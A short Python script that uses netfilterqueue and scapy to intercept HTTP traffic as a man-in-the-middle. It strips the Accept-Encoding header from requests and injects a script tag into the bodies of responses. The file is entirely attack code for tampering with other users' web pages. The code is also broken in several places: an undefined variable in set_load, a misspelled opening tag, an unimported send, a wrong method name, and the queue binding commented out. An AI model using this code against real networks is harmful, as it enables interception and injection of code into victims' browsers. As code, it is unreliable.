#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re

ack_list = []


def set_load(packet, load):
    http_packet[scapy.Raw].load = load
    del http_packet[scapy.IP].len
    del http_packet[scapy.IP].chksum
    del http_packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    http_packet = scapy.IP(packet.get_payload())
    if http_packet.haslayer(scapy.Raw):
        load = http_packet[scapy.Raw].load
        if http_packet[scapy.TCP].dport == 80:
            print("[+] Request...")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

        elif http_packet[scapy.TCP].sport == 80:
            print("[+] Response...")
            load = load.replace("</body>", "<scrip>alert('test');</script></body>")
            content_length_search = re.search("Content-Length:\\s\\d*", load)
            if content_length_search:
                content_length = content_length_search.group(0)
                print(content_length)

        if load != http_packet[scapy.Raw].load:
            new_packet = set_load(http_packet, load)
            packet.setpayload(str(new_packet))

    packet.accept()
    send(http_packet)


# queue = netfilterqueue.NetfilterQueue()
# queue.bind(0, process_packet)
# queue.run()
